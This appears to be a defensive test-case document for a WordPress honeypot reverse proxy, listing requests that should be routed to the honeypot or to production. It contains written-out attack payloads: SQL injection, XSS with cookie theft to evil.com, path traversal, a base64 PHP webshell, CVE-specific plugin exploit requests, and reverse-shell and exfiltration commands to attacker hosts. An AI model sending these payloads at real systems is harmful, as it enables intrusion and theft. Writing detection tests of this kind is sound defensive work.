# Honeypot Routing Test Cases

This document contains test cases for manually verifying that the reverse proxy correctly routes malicious/suspicious traffic to the honeypot while keeping legitimate traffic on production.

## Table of Contents
1. [Vulnerable Plugin URLs](#vulnerable-plugin-urls)
2. [CVE-Specific Exploit Patterns](#cve-specific-exploit-patterns)
3. [Suspicious Request Patterns](#suspicious-request-patterns)
4. [SQL Injection Attempts](#sql-injection-attempts)
5. [XSS (Cross-Site Scripting) Attempts](#xss-cross-site-scripting-attempts)
6. [Directory Traversal Attempts](#directory-traversal-attempts)
7. [Command Injection Attempts](#command-injection-attempts)
8. [Suspicious Headers](#suspicious-headers)
9. [Malicious User Agents](#malicious-user-agents)
10. [WordPress-Specific Attacks](#wordpress-specific-attacks)
11. [File Upload Exploits](#file-upload-exploits)
12. [Legitimate URLs (Should Route to Production)](#legitimate-urls-should-route-to-production)

---

## Vulnerable Plugin URLs

These URLs target known vulnerable WordPress plugins and should be routed to the **honeypot**.

```
GET /wp-content/plugins/woocommerce-payments/admin.php
GET /wp-content/plugins/woocommerce-payments/includes/payment-gateway.php
GET /wp-content/plugins/abandoned-cart-lite/checkout.php
GET /wp-content/plugins/drag-and-drop-multiple-file-upload/upload-handler.php
GET /wp-content/plugins/cwmp/admin.php
GET /wp-content/plugins/gift-voucher/preview.php
GET /wp-content/plugins/advanced-form-integration/integration.php
GET /wp-content/plugins/pagseguro-connect-woocommerce/callback.php
GET /wp-content/plugins/wp-file-upload/upload.php
```

**Note:** Static assets from these plugins (CSS/JS) should still route to production:
```
GET /wp-content/plugins/woocommerce-payments/assets/style.css
GET /wp-content/plugins/abandoned-cart-lite/js/script.js
```

---

## CVE-Specific Exploit Patterns

### CVE-2023-28121 (WooCommerce Payments)
**Expected Route:** Honeypot

Request with malicious header:
```
GET / HTTP/1.1
Host: openstack.local
X-WCPAY-PLATFORM-CHECKOUT-USER: admin
```

### CVE-2023-2986 (Abandoned Cart Lite)
**Expected Route:** Honeypot

```
GET /?wcal_action=checkout_link&wcal_id=1 HTTP/1.1
POST /wp-admin/admin-ajax.php?action=wcal_action&wcal_action=checkout_link
```

### CVE-2025-4403 (Drag and Drop Multiple File Upload)
**Expected Route:** Honeypot

```
POST /wp-admin/admin-ajax.php?action=dnd-wc-upload-file HTTP/1.1
POST /?action=dnd_codedropz_upload HTTP/1.1
```

### CVE-2025-2266 (CWMP)
**Expected Route:** Honeypot

```
POST /wp-admin/admin-ajax.php?action=cwmpUpdateOptions HTTP/1.1
GET /?cwmpUpdateOptions=true HTTP/1.1
```

### CVE-2025-47577 & CVE-2024-8425 (Gift Voucher)
**Expected Route:** Honeypot

```
POST /wp-admin/admin-ajax.php?action=mwb_wgm_preview_mail HTTP/1.1
GET /?mwb_wgm_preview_mail=test HTTP/1.1
```

### CVE-2024-2387 (Advanced Form Integration)
**Expected Route:** Honeypot

```
GET /?integration_id=1' OR '1'='1 HTTP/1.1
POST /wp-admin/admin-ajax.php?integration_id=1' HTTP/1.1
```

### CVE-2025-10142 (PagSeguro Connect)
**Expected Route:** Honeypot

```
POST /wp-admin/admin-ajax.php?action=pc_added_uploaded_image HTTP/1.1
```

### CVE-2024-50508 (WP File Upload)
**Expected Route:** Honeypot

```
GET /?file[path]=../../wp-config.php HTTP/1.1
POST /upload.php?file[path]=/etc/passwd HTTP/1.1
```

---

## Suspicious Request Patterns

### Path Traversal Patterns
**Expected Route:** Honeypot

```
GET /../../../etc/passwd HTTP/1.1
GET /wp-content/uploads/../../wp-config.php HTTP/1.1
GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
GET /....//....//....//etc/passwd HTTP/1.1
```

### PHP Wrappers (File Inclusion)
**Expected Route:** Honeypot

```
GET /?file=php://filter/convert.base64-encode/resource=wp-config HTTP/1.1
GET /?page=php://input HTTP/1.1
GET /?file=file:///etc/passwd HTTP/1.1
GET /?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= HTTP/1.1
```

### Encoded Attacks (Evasion Attempts)
**Expected Route:** Honeypot

```
GET /%75%6e%69%6f%6e%20%73%65%6c%65%63%74 HTTP/1.1
GET /%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
GET /?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1
```

---

## SQL Injection Attempts

**Expected Route:** Honeypot

### Basic SQL Injection
```
GET /?id=1' OR '1'='1 HTTP/1.1
GET /?id=1 OR 1=1-- HTTP/1.1
GET /?id=1'; DROP TABLE users-- HTTP/1.1
GET /?user=admin'-- HTTP/1.1
```

### UNION-based SQL Injection
```
GET /?id=1 UNION SELECT null,username,password FROM users-- HTTP/1.1
GET /?id=-1 UNION ALL SELECT 1,2,3,4,5,6-- HTTP/1.1
GET /search?q=' UNION SELECT @@version-- HTTP/1.1
```

### Advanced SQL Injection
```
GET /?id=1' AND SLEEP(5)-- HTTP/1.1
GET /?id=1'; INSERT INTO users VALUES ('hacker','password')-- HTTP/1.1
GET /?user=admin' AND 1=1-- HTTP/1.1
GET /?search=test' AND (SELECT COUNT(*) FROM users) > 0-- HTTP/1.1
```

---

## XSS (Cross-Site Scripting) Attempts

**Expected Route:** Honeypot

### Basic XSS
```
GET /?search=<script>alert(1)</script> HTTP/1.1
GET /?name=<script>alert(document.cookie)</script> HTTP/1.1
GET /?comment=<img src=x onerror=alert(1)> HTTP/1.1
```

### Advanced XSS
```
GET /?msg=<svg/onload=alert(1)> HTTP/1.1
GET /?data=<iframe src=javascript:alert(1)> HTTP/1.1
GET /?input=<body onload=alert('XSS')> HTTP/1.1
GET /?test=javascript:alert(document.domain) HTTP/1.1
GET /?value=<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)> HTTP/1.1
```

### Event Handler XSS
```
GET /?search=<input onfocus=alert(1) autofocus> HTTP/1.1
GET /?name=<marquee onstart=alert(1)> HTTP/1.1
GET /?data=<select onfocus=alert(1) autofocus> HTTP/1.1
```

---

## Directory Traversal Attempts

**Expected Route:** Honeypot

```
GET /../../../../etc/passwd HTTP/1.1
GET /wp-content/uploads/../../wp-config.php HTTP/1.1
GET /../../../windows/win.ini HTTP/1.1
GET /images/../../../etc/shadow HTTP/1.1
GET /files/....//....//....//etc/passwd HTTP/1.1
```

---

## Command Injection Attempts

**Expected Route:** Honeypot

### Basic Command Injection
```
GET /?cmd=;cat /etc/passwd HTTP/1.1
GET /?exec=| ls -la HTTP/1.1
GET /?run=`whoami` HTTP/1.1
GET /?ping=127.0.0.1; cat /etc/passwd HTTP/1.1
```

### Advanced Command Injection
```
GET /?cmd=$(curl http://evil.com/shell.sh) HTTP/1.1
GET /?exec=;nc -e /bin/bash attacker.com 4444 HTTP/1.1
GET /?run=&&curl http://evil.com?data=$(cat /etc/passwd) HTTP/1.1
GET /?system=`cat /var/www/html/wp-config.php` HTTP/1.1
```

---

## Suspicious Headers

**Expected Route:** Honeypot

### CVE-Specific Headers
```
GET / HTTP/1.1
Host: openstack.local
X-WCPAY-PLATFORM-CHECKOUT-USER: ../../../etc/passwd
```

### Command Injection in Headers
```
GET / HTTP/1.1
Host: openstack.local
X-Forwarded-For: 127.0.0.1; cat /etc/passwd
Referer: javascript:alert(1)
```

### Missing Referer on POST
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: openstack.local
Content-Type: application/x-www-form-urlencoded
(no Referer header)
```

---

## Malicious User Agents

**Expected Route:** Honeypot (High Threat Score)

### Security Scanners
```
User-Agent: sqlmap/1.0
User-Agent: Nikto/2.1.6
User-Agent: Nmap Scripting Engine
User-Agent: WPScan v3.8.1
User-Agent: OWASP ZAP 2.10.0
User-Agent: Burp Suite Professional
User-Agent: Havij
User-Agent: Acunetix
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
```

### Automated Tools
```
User-Agent: python-requests/2.25.1
User-Agent: Go-http-client/1.1
User-Agent: Apache-HttpClient/4.5.2
User-Agent: Gobuster/3.1
User-Agent: DirBuster-1.0
User-Agent: masscan/1.0
```

### Exploitation Frameworks
```
User-Agent: Metasploit
User-Agent: exploit/multi/handler
User-Agent: scanner/malware/exploit
```

---

## WordPress-Specific Attacks

**Expected Route:** Honeypot

### wp-config.php Access Attempts
```
GET /wp-config.php HTTP/1.1
GET /wordpress/wp-config.php HTTP/1.1
GET /wp-config.php.bak HTTP/1.1
GET /wp-config.old HTTP/1.1
GET /backup/wp-config.php HTTP/1.1
```

### xmlrpc.php Attacks
```
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value>...</value></param>
  </params>
</methodCall>
```

### WordPress Installation Access
```
GET /wp-admin/install.php HTTP/1.1
GET /wp-admin/setup-config.php HTTP/1.1
```

### User Enumeration
```
GET /?author=1 HTTP/1.1
GET /wp-json/wp/v2/users HTTP/1.1
GET /?rest_route=/wp/v2/users HTTP/1.1
```

### Brute Force Attempts (Multiple Rapid Requests)
```
POST /wp-login.php (20+ times within 1 minute)
POST /wp-login.php?action=login (rapid succession)
```

---

## File Upload Exploits

**Expected Route:** Honeypot

### Malicious File Extension Uploads
```
POST /wp-admin/admin-ajax.php?action=upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
```

### Known Vulnerable Upload Actions
```
POST /wp-admin/admin-ajax.php?action=dnd_codedropz_upload HTTP/1.1
POST /wp-admin/admin-ajax.php?action=mwb_wgm_preview_mail HTTP/1.1
POST /wp-admin/admin-ajax.php?action=pc_added_uploaded_image HTTP/1.1
```

### Suspicious File Names in Upload Parameters
```
POST /upload.php?file=shell.php HTTP/1.1
POST /upload.php?file=backdoor.asp HTTP/1.1
POST /upload.php?file=webshell.jsp HTTP/1.1
POST /upload.php?file=malware.exe HTTP/1.1
```

---

## Legitimate URLs (Should Route to Production)

**Expected Route:** Production

### Homepage and Basic Pages
```
GET / HTTP/1.1
GET /shop HTTP/1.1
GET /cart HTTP/1.1
GET /checkout HTTP/1.1
GET /my-account HTTP/1.1
GET /about-us HTTP/1.1
GET /contact HTTP/1.1
```

### Static Assets (CSS, JS, Images)
```
GET /wp-includes/css/dist/block-library/style.min.css?ver=6.8.3 HTTP/1.1
GET /wp-content/themes/omega-storefront/style.css HTTP/1.1
GET /wp-content/plugins/woocommerce/assets/css/woocommerce.css HTTP/1.1
GET /wp-content/themes/theme/js/script.js HTTP/1.1
GET /wp-content/uploads/2024/01/product-image.jpg HTTP/1.1
GET /wp-includes/js/jquery/jquery.min.js HTTP/1.1
```

### Font Files
```
GET /wp-content/themes/omega-storefront/fonts/roboto/font.css HTTP/1.1
GET /wp-content/themes/theme/fonts/font.woff2 HTTP/1.1
GET /fonts/OpenSans-Regular.ttf HTTP/1.1
```

### Legitimate API Endpoints
```
GET /wp-json/wc/v3/products HTTP/1.1
GET /wp-json/wp/v2/posts HTTP/1.1
POST /wp-json/wc/store/cart/add-item HTTP/1.1
```

### Product Pages
```
GET /product/example-product/ HTTP/1.1
GET /category/electronics/ HTTP/1.1
GET /?product_id=123 HTTP/1.1
```

### Normal User Behavior
```
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://google.com/

(followed by multiple legitimate asset requests with same User-Agent)
```

---

## Testing Methodology

### 1. Manual Browser Testing
- Open browser with developer tools
- Navigate to test URLs
- Check response headers for `X-Route-Target` (should be "production" or "honeypot")
- Verify logs show correct routing

### 2. cURL Testing
```bash
# Test legitimate request
curl -v http://openstack.local/ \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15)" \
  | grep -i "x-route-target"

# Test malicious request
curl -v "http://openstack.local/?id=1' OR '1'='1" \
  -H "User-Agent: sqlmap/1.0" \
  | grep -i "x-route-target"

# Test vulnerable plugin
curl -v "http://openstack.local/wp-content/plugins/woocommerce-payments/admin.php" \
  | grep -i "x-route-target"
```

### 3. Automated Testing Script
```bash
#!/bin/bash

echo "Testing Honeypot Routing..."

# Test 1: Legitimate request
echo "Test 1: Legitimate homepage"
curl -s -I http://openstack.local/ | grep -i "x-route-target"

# Test 2: SQL Injection
echo "Test 2: SQL Injection attempt"
curl -s -I "http://openstack.local/?id=1' OR '1'='1" | grep -i "x-route-target"

# Test 3: Vulnerable plugin
echo "Test 3: Vulnerable plugin access"
curl -s -I "http://openstack.local/wp-content/plugins/woocommerce-payments/admin.php" | grep -i "x-route-target"

# Test 4: Static asset (should be production)
echo "Test 4: Static CSS file"
curl -s -I "http://openstack.local/wp-content/themes/theme/style.css" | grep -i "x-route-target"

# Test 5: Malicious User-Agent
echo "Test 5: Scanner User-Agent"
curl -s -I http://openstack.local/ -H "User-Agent: sqlmap/1.0" | grep -i "x-route-target"
```

### 4. Log Analysis
Check the logs to verify routing:
```bash
# Check production logs
docker logs production_eshop-1 | tail -n 50

# Check honeypot logs
docker logs honeypot_eshop-1 | tail -n 50

# Check nginx security logs
docker exec reverse_proxy tail -n 100 /var/log/nginx/security.log
```

---

## Expected Threat Scores

| Request Type | Expected Threat Score | Route |
|--------------|----------------------|-------|
| Legitimate homepage | 0 | Production |
| Static assets | 0 | Production |
| SQL Injection | 40-60 | Honeypot |
| XSS Attempt | 40-60 | Honeypot |
| CVE-specific pattern | 80+ | Honeypot |
| Malicious User-Agent | 50+ | Honeypot |
| Vulnerable plugin PHP file | 60+ | Honeypot |
| Command Injection | 50-70 | Honeypot |
| Directory Traversal | 40-60 | Honeypot |

---

## Notes

- **Honeypot Threshold:** Currently set to 80 (increased from 50 to reduce false positives)
- **Session Binding:** Once a session is routed to honeypot, all subsequent requests from that session stay in honeypot
- **Static Assets:** Always route to production regardless of session state
- **Whitelisted IPs:** Traffic from whitelisted IP ranges (Tailscale, STUBA, local networks) gets negative threat score adjustments
- **Request Rate:** Legitimate browsing (20+ static asset requests) should not trigger honeypot routing
